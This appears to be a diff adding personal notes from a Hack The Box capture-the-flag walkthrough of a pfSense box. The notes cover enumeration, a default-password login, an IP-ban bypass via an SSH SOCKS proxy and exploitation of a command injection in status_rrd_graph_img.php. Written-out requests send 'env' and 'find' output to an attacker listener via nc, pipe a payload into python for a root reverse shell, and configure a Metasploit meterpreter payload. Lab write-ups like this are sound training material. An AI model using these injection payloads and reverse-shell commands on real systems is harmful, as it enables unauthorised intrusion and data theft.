@@ -1,0 +1,253 @@
+1. Start with nmap scan of the box: 
+nmap -sC -sV -oA nmap-sense/init-scan 10.10.10.60  
+breakdown: 
+-sC = default scripts
+-sV = enumerate version info 
+-oA = output scan results in all formats
+
+NOTE: by default namp runs its scan by sending SYN only. 
+optional you can add the flag -sT will run a full TCP scan
+
+2. Results from scan: 
+PORT    STATE SERVICE    VERSION
+80/tcp  open  http       lighttpd 1.4.35
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Did not follow redirect to https://10.10.10.60/
+443/tcp open  ssl/https?
+| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
+| Not valid before: 2017-10-14T19:21:35
+|_Not valid after:  2023-04-06T19:21:35
+|_ssl-date: TLS randomness does not represent time
+
+3. 80 is open so taking a look at the site 
+> this is the pfsense login page
+> no interesting info in the cert
+
+4. Open burp and test the login request 
+> POST is using a CSRF token 
+> PHP session ID is included as well 
+
+POST /index.php HTTP/1.1
+Host: 10.10.10.60
+Connection: close
+Content-Length: 187
+Cache-Control: max-age=0
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+Origin: https://10.10.10.60
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://10.10.10.60/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=821c374de5bb5c10056cc9af90f49997; cookie_test=1625320253
+
+__csrf_magic=sid%3A75d2e82741be5d9bfcb4f865b8ebaafb532f0d33%2C1625316653%3Bip%3A02a47c6e3e0d148af9294f2086e36a28eca92062%2C1625316653&usernamefld=username&passwordfld=password&login=Login
+
+4. Run gobuster scan against 10.10.10.60
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x .php,.txt,.bash 
+dir =  directory mode
+-k = ignore ssl cert verification 
+-x = add extensions to each request
+
+5. note by default pfsense will ban you for 15 failed login attempts. The ban is associated with port 443. 
+If you get banned you can see about getting around it by proxying your connection to another box you have access to: 
+- ssh into a box you have access to 
+- verify that the box can hit your target machine via "curl -k https://<TARGET-IP>"
+- If the curl is successful then run "ssh -D1080 <IP ADDRESS OF THE UNBANNED BOX YOU SSH'ED INTO>" on your banned box
+-- NOTE -D sets a dynamic port the above command will create a proxy that you can then send your web requests over 
+from your banned machine
+- confirm that it is working by running a netstat query "netstat -alnp | grep LIST| grep 1080" 
+-- you should then see that 127.0.0.1:1080 is listening. 
+0 To use this with Burp go to User options -> SOCKS Proxy -> check Use SOCKS proxy -> and make sure that 127.0.0.1 is the host
+and that SOCK proxy port is set to 1080
+
+6. Gobuster scan shows two interesting files: 
+/system-users.txt  
+/changelog.txt  
+
+changelog.txt shows: 
+# Security Changelog 
+
+### Issue
+There was a failure in updating the firewall. Manual patching is therefore required
+
+### Mitigated
+2 of 3 vulnerabilities have been patched.
+
+### Timeline
+The remaining patches will be installed during the next maintenance window
+
+system-users.txt shows: 
+####Support ticket###
+
+Please create the following user
+
+username: Rohit <<<< USERNAME
+password: company defaults <<<<< trying pfsense default password "pfsense" 
+
+
+7. loggesd in as rohit:pfsense
+
+8. Check pfsense version for known vulns: 2.1.3-RELEASE
+https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=pfsense
+
+First Test: 
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4688
+
+pfsense command injection: 
+https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/ 
+
+- of the vuls listed here the one to focus on is "Command Injection in status_rrd_graph_img.php"
+- these graphs can be found on the pfsense box here https://10.10.10.60/status_rrd_graph.php 
+- overview: 
+ if ($_GET['database']) {
+  $curdatabase = basename($_GET['database']); <<< 1. this variable on GET requests
+  } else {
+  $curdatabase = "wan-traffic.rrd";
+  }
+
+ ...
+
+ if(strstr($curdatabase, "queues")) { <<< 2. run against the queues database 
+  log_error(sprintf(gettext("failed to create graph from %s%s,
+emoving database"),$rrddbpath,$curdatabase));
+  exec("/bin/rm -f $rrddbpath$curif$queues");
+  Flush();
+  Usleep(500);
+  enable_rrd_graphing();
+  }
+  if(strstr($curdatabase, "queuesdrop")) {
+  log_error(sprintf(gettext("failed to create graph from %s%s,
+emoving database"),$rrddbpath,$curdatabase));
+  exec("/bin/rm -f $rrddbpath$curdatabase"); <<< 3. gest passed down to here where it is 'exec'ed adding a ";" at the end could allow for commands. 
+  Flush();
+  Usleep(500);
+  enable_rrd_graphing();
+  }
+
+Exploit DB reference: 
+https://www.exploit-db.com/exploits/43560 [this includes an exploit script]
+
+
+Antohter possible option:  
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10709
+
+9. testing the exploit
+- open one of the images in a new tab and copy the URL 
+- edit the url down so that it looks like this: 
+https://10.10.10.60/status_rrd_graph_img.php?database=system-processor.rrd
+- send the above url over to burp's repeater
+- send a PoC request with a sleep command:
+-- note db is set to queues 
+-- success is if the response to the GET comes back at ~10s 
+
+GET /status_rrd_graph_img.php?database=queues;sleep+10 HTTP/1.1
+Host: 10.10.10.60
+Connection: close
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=821c374de5bb5c10056cc9af90f49997; cookie_test=1625322240
+
+Testing REC with outpot to a listener on my box 
+
+Request: 
+GET /status_rrd_graph_img.php?database=queues;echo+naughtron|nc+10.10.14.5+9001 
+
+Response: 
+$ nc -lvnp 9001                                     
+listening on [any] 9001 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.60] 7936
+naughtron
+
+10. Use exploit to view filesystem of the box
+- The following do not work as is. 
+GET /status_rrd_graph_img.php?database=queues;find+/|nc+10.10.14.5+9001 
+GET /status_rrd_graph_img.php?database=queues;find+.|nc+10.10.14.5+9001 
+
+- Send this request to find the env var that contains "/"
+request: 
+GET /status_rrd_graph_img.php?database=queues;env|nc+10.10.14.5+9001 
+
+response: 
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.60] 20446
+OLDPWD=/
+HOME=/
+PHP_FCGI_MAX_REQUESTS=500
+PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin
+LANG=en_US.ISO8859-1
+PHP_FCGI_CHILDREN=1
+PWD=/var/db/rrd
+
+- make the find request again with the home env variable
+Request:
+GET /status_rrd_graph_img.php?database=queues;find+${HOME}|nc+10.10.14.5+9001 
+Response in filesystem.txt
+
+11. getting a reverse shell using the exploit
+using reverse-shell.py 
+listener: 
+nc -lvnp 9001 < reverse-shell  NOTE: "reverse-shell" is there so if there is a connection then the shell is sent
+
+listener for script: 
+nc -lvnp 1234
+
+request: 
+GET /status_rrd_graph_img.php?database=queues;nc+10.10.14.5+9001|python
+
+on 1234 listener a shell will spawn: 
+# whoami
+root
+
+Same thing via metasploit: 
+msf6 > search pfsense
+
+Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank       Check  Description
+   -  ----                                            ---------------  ----       -----  -----------
+   0  exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     No     Clickjacking Vulnerability In CSRF Error Page pfSense
+   USE THIS >>>>> 1  exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  No     pfSense authenticated graph status RCE
+   2  exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  Yes    pfSense authenticated group member RCE
+
+msf6 exploit(unix/http/pfsense_graph_injection_exec) > show options
+
+Module options (exploit/unix/http/pfsense_graph_injection_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  pfsense          yes       Password to login with
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS    10.10.10.60      yes       The target host(s), range CIDR identifier, or hosts file with synta
+                                        x 'file:<path>'
+   RPORT     443              yes       The target port (TCP)
+   SSL       true             no        Negotiate SSL/TLS for outgoing connections
+   USERNAME  rohit            yes       User to login with
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.5       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Brute Force Script: 
+brute-force-pfsense.pys
